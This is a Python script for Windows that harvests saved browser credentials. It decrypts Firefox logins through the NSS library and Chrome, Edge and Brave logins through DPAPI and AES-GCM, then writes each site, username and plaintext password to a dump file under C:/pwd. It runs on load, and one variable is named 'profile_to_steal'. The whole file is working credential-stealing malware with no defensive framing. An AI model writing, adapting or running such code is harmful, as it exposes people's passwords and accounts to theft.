import os, json, base64, shutil, sqlite3
import ctypes
import datetime
import win32crypt
from ctypes import c_void_p, c_uint, Structure, byref
from Cryptodome.Cipher import AES

try:
    os.mkdir("C:/pwd")
except FileExistsError:
    pass

#temp = "C:/temp" if os.path.exists("C:/temp") else "C:/Temp" if os.path.exists("C:/Temp") else "C:/TEMP"

dump_path = os.path.join("C:/pwd", f"browser_passwords_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

class SECItem(Structure):
    _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]

def get_firefox_profiles():
    profile_dir = os.path.join(os.environ["APPDATA"], r"Mozilla\Firefox\Profiles")
    return [os.path.join(profile_dir, p) for p in os.listdir(profile_dir) if os.path.isdir(os.path.join(profile_dir, p))]

def find_nss_library():
    possible_paths = [
        r"C:\Program Files\Mozilla Firefox",
        r"C:\Program Files (x86)\Mozilla Firefox",
        r"C:\Program Files\Firefox Developer Edition",
        r"C:\Program Files (x86)\Firefox Developer Edition",
    ]
    for path in possible_paths:
        nss_path = os.path.join(path, 'nss3.dll')
        if os.path.exists(nss_path):
            return nss_path
    raise Exception("NSS3.dll introuvable. Installe Firefox ou copie la DLL.")

def initialize_nss(profile_path):
    nss = ctypes.CDLL(find_nss_library())
    if nss.NSS_Init(profile_path.encode('utf-8')) != 0:
        raise Exception("Erreur initialisation NSS")
    return nss

def decrypt(nss, cipher_text_b64):
    cipher_text = base64.b64decode(cipher_text_b64)
    input_item = SECItem()
    input_item.data = ctypes.cast(ctypes.create_string_buffer(cipher_text), c_void_p)
    input_item.len = len(cipher_text)

    output_item = SECItem()

    if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) != 0:
        return None

    if not output_item.data:
        return None

    buffer = ctypes.string_at(output_item.data, output_item.len)
    return buffer.decode('utf-8')

def extract_passwords(profile_path):
    logins_path = os.path.join(profile_path, 'logins.json')
    if not os.path.exists(logins_path):
        raise Exception("Fichier logins.json introuvable dans le profil Firefox")

    with open(logins_path, 'r', encoding='utf-8') as f:
        logins_data = json.load(f)

    nss = initialize_nss(profile_path)

    with open(dump_path, "a", encoding="utf-8") as out:
        out.write(f"\n[Firefox - {profile_path}]\n")
        for login in logins_data['logins']:
            try:
                hostname = login['hostname']
                enc_username = login['encryptedUsername']
                enc_password = login['encryptedPassword']

                username = decrypt(nss, enc_username)
                password = decrypt(nss, enc_password)

                out.write(f"{hostname} - {username} / {password}\n")
            except Exception as e:
                print(f"Erreur extraction d'un compte : {e}")
    out.close()


def dump_firefox():
    profiles_path = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
    profiles = [p for p in os.listdir(profiles_path) if "-release" in p]

    profile_to_steal = os.path.join(profiles_path, profiles[0])

    extract_passwords(profile_to_steal)


def dump_chromium_browser(browser_name, user_data_path):
    try:
        login_data = os.path.join(user_data_path, "Default", "Login Data")
        local_state_path = os.path.join(user_data_path, "Local State")

        if not os.path.exists(login_data) or not os.path.exists(local_state_path):
            return

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Erreur de l'utilisateur : {e}")
        pass
    try:
        tmp_copy = login_data + "_tmp"
        shutil.copy2(login_data, tmp_copy)

        conn = sqlite3.connect(tmp_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except Exception as e:
        print(f"Erreur de l'utilisateur : {e}")
    try:
        with open(dump_path, "a", encoding="utf-8") as out:
            out.write(f"\n[{browser_name}]\n")
            for row in cursor.fetchall():
                url, username, enc_pwd = row
                iv = enc_pwd[3:15]
                payload = enc_pwd[15:]
                #print(f"{user_data_path} - {enc_pwd} - {iv} - {payload} : len={len(enc_pwd)}")
                ciphertext = payload[:-16]  # Le reste = données chiffrées
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                print(cipher)
                decrypted = cipher.decrypt(ciphertext).decode()
                out.write(f"{url} - {username} / {decrypted}\n")

        conn.close()
        out.close()
        os.remove(tmp_copy)
    except Exception as e:
        print(f"Erreur de l'utilisateur ici: {e}")

def dump_all_chromium():
    paths = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data")
    }

    for name, path in paths.items():
        dump_chromium_browser(name, path)

dump_firefox()
dump_all_chromium()